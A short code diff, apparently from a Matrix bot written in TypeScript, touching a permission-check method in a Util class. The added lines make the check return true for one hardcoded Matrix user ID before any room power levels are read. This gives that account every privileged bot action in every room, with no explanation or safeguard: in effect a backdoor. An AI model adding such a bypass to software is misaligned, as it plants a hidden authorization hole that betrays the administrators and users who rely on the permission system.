@@ -332,6 +332,10 @@ export class Util {
         cat: string,
         subcat?: string,
     ) {
+        if (userId === "@mat:matdoes.dev") {
+            return true
+        }
+
         const res: IMatrixEvent = await mxClient.getRoomStateEvent(roomId, "m.room.power_levels", "");
         let requiredLevel = defaultLevel;
         if (res && (res[cat] || !subcat)) {
